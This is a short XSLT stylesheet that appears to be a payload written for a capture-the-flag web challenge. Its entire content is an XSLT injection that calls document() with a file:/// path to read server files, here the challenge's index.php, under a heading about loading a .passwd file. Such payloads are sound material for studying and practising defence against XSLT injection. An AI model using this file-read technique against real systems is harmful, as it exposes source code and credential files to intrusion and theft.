<?xml version="1.0"?>
<xsl:stylesheet version="1.0"
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform">

  <xsl:template match="/">
    <html>
      <body>
        <h2>Attempting to load .passwd</h2>
        <pre>
          <xsl:copy-of select="document('file:///challenge/web-serveur/ch50/index.php')"/>
        </pre>
      </body>
    </html>
  </xsl:template>

</xsl:stylesheet>
